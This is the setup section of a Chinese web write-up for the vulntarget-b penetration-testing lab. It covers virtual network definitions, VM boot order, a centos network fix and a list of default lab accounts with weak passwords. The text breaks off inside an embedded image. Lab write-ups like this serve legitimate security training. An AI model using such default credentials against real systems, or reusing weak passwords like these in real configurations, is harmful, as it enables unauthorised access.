<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Independent-Environment/Vulntarget/vulntarget-b/index" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.6.3">
<title data-rh="true">vulntarget-b | Target Machines WriteUp</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-b/"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="vulntarget-b | Target Machines WriteUp"><meta data-rh="true" name="description" content="简介"><meta data-rh="true" property="og:description" content="简介"><link data-rh="true" rel="icon" href="/Target-Machines-WriteUp/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-b/"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-b/" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-b/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/Target-Machines-WriteUp/blog/rss.xml" title="Target Machines WriteUp RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Target-Machines-WriteUp/blog/atom.xml" title="Target Machines WriteUp Atom Feed">



<link rel="preconnect" href="https://static.cloudflareinsights.com">
<script src="https://static.cloudflareinsights.com/beacon.min.js" defer="defer" data-cf-beacon="{&quot;token&quot;:&quot;419208379f5c472a9afad0d3dc0396f9&quot;}"></script>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/Target-Machines-WriteUp/assets/css/styles.b5431df6.css">
<script src="/Target-Machines-WriteUp/assets/js/runtime~main.e17238f4.js" defer="defer"></script>
<script src="/Target-Machines-WriteUp/assets/js/main.92e08b4a.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Target-Machines-WriteUp/"><div class="navbar__logo"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Target Machines WriteUp</b></a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/HackTheBox/">HackTheBox</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Yunjing/">春秋云境</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/HackMyVM/">HackMyVM</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Xuanji/">玄机</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/Target-Machines-WriteUp/docs/Independent-Environment/">其他靶场</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/ToolsGuide/">Tools Guide</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/blog">Blog</a><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z"><input placeholder="搜索" aria-label="Search" class="navbar__search-input"><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/Target-Machines-WriteUp/docs/Independent-Environment/">其他靶场</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/Independent-Environment/NSS/">2024-NSS</a><button aria-label="展开侧边栏分类 &#x27;2024-NSS&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/Target-Machines-WriteUp/docs/Independent-Environment/CTFShow/WEB入门/命令执行/">CTFShow</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/DockerLabs">DockerLabs</a><button aria-label="展开侧边栏分类 &#x27;DockerLabs&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/Fengtaisec">纵横网络靶场</a><button aria-label="展开侧边栏分类 &#x27;纵横网络靶场&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/Target-Machines-WriteUp/docs/Independent-Environment/Hacker101-CTF/A little something to get you started">Hacker101-CTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/K8sLanParty">Kubernetes LAN Party</a><button aria-label="展开侧边栏分类 &#x27;Kubernetes LAN Party&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/OverTheWire">OverTheWire</a><button aria-label="展开侧边栏分类 &#x27;OverTheWire&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/Target-Machines-WriteUp/docs/Independent-Environment/Puff-Pastry/">Puff-Pastry</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/Reversing_Kr">Reversing.Kr</a><button aria-label="展开侧边栏分类 &#x27;Reversing.Kr&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/Redclub">Redclub - 红日靶场</a><button aria-label="展开侧边栏分类 &#x27;Redclub - 红日靶场&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/Target-Machines-WriteUp/docs/category/Vulntarget">Vulntarget</a><button aria-label="折叠侧边栏分类 &#x27;Vulntarget&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-a/">vulntarget-a</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-b/">vulntarget-b</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/Target-Machines-WriteUp/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/Target-Machines-WriteUp/docs/category/Vulntarget"><span itemprop="name">Vulntarget</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">vulntarget-b</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总 览</button></div><div class="theme-doc-markdown markdown"><header><h1>vulntarget-b</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="简介">简介<a href="#简介" class="hash-link" aria-label="简介的直接链接" title="简介的直接链接">​</a></h2>
<p><a href="https://mp.weixin.qq.com/s/S3aiKN_IIhxWRyizAb8zLg" target="_blank" rel="noopener noreferrer">vulntarget 漏洞靶场系列（二）— vulntarget-b</a></p>
<p>靶场的网络拓扑</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241103-200356-8d3082423191b1864072577508e5d7b3.png" width="1080" height="416" class="img_ev3q"></p>
<p>需要在虚拟网络编辑器中，定义两个虚拟网络</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">VMnet18 Host-only: 10.0.20.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VMnet19 Host-only: 10.0.10.0/24</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>centos</code> 这台虚拟机作为入口机，默认的网卡包含一张桥接模式的虚拟网卡，可以视实际情况进行修改</p>
<p>直接导入 3 个虚拟机即可，公众号写的是设计靶场的过程</p>
<p>建议按照 <code>server2016</code> -&gt;  <code>win10</code>-&gt;  <code>centos</code> 的顺序进行启动虚拟机</p>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p><code>win10</code> 这台靶机带有自动睡眠，需要注意</p></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">账号信息</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">server2016 域控</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Domain: vulntarget.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Domain Username: administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Domain Password: Admin@123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Domain Username: win101</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Domain Password: admin#123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">win10 域成员</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Local Username: win10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Local Password: win10#123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Local Administrator: administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Local Admin-Password: admin@123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Domain Username: vulntarget\win101</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Domain Password: admin#123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Web-Pannel Username: admin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Web-Pannel Password: Admin123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">centos 入口机</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- root/root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- vulntarget/root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>server2016 域控 使用原有密码登陆的时候，会触发强制密码更改规则</p><p>我这边改为 <code>zxc@123zxc</code></p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="centos-虚拟机修复"><code>centos</code> 虚拟机修复<a href="#centos-虚拟机修复" class="hash-link" aria-label="centos-虚拟机修复的直接链接" title="centos-虚拟机修复的直接链接">​</a></h2>
<p>因为我自己将网卡桥接改为 NAT 网卡，导致 <code>centos</code> 这台虚拟机的网络失效，需要进入系统手  动修复网络</p>
<p>使用 <code>root/root</code> 登陆系统</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmcli connection show</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="data:image/png;base64,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